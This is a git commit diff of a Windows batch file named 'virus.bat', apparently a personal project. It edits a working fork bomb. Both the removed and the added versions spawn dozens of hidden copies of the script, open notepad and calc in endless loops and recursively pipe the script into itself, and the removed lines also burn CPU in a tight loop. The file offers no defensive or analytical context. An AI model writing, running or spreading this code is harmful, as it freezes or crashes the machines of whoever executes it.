fffcc950cf220cd88e77c1e54014a3beecfa5670
AnthonyGrullonA <anthonygrulon283@gmail.com>
2026-04-12 22:16:21 -0400

    otroma

--- virus.bat
+++ virus.bat
@@ -1,25 +1,7 @@
 @echo off
-REM ========================================
-REM BACKGROUND TOTAL - 0 CMD
-REM ========================================
-if "%1"=="H" goto :H
-
-REM 40 SPAWNS BACKGROUND
-for /l %%i in (1,1,40) do start /b cmd /c "%~f0" H
-exit /b
-
-:H
-:saturacion
-REM LEGITIMOS EN BACKGROUND
-start /b notepad.exe
-start /b calc.exe
-start /b explorer.exe
-
-REM PIPE INVISIBLE
-start /b %0 H
+for /l %%i in (1,1,25) do start /b %0
+:kill
+start /b notepad
+start /b calc
 %0|%0|%0|%0
-
-REM CPU DIRECTO
-for /l %%i in (1,1,50000) do set /a "x=%%i*2"
-
-goto saturacion
+goto kill
